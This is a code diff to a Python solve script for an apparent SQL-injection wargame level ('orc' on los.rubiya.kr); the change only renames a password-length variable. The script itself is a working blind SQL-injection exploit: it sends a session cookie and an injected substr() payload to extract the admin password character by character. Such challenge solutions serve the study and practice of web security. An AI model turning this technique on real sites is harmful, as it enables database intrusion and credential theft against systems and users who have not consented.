@@ -15,7 +15,6 @@ import string
 
 cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
 url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
-
 password_length = 0
 
 for x in range(0, 10):
@@ -26,7 +25,7 @@ for x in range(0, 10):
   response = requests.get(full_url, cookies=cookies)
     
   if "Hello admin" in response.text:
-    pw_length = x
+    password_length = x
     break
 
 print()    
@@ -37,7 +36,7 @@ print()
 password = ""
 searchspace = string.digits + string.ascii_letters
 
-for index in range(1, pw_length + 1):
+for index in range(1, password_length + 1):
   for char in searchspace:
     payload = f"' || id='admin' && substr(pw, {index}, 1)='{char}' -- -"
     encoded_payload = urllib.parse.quote_plus(payload)
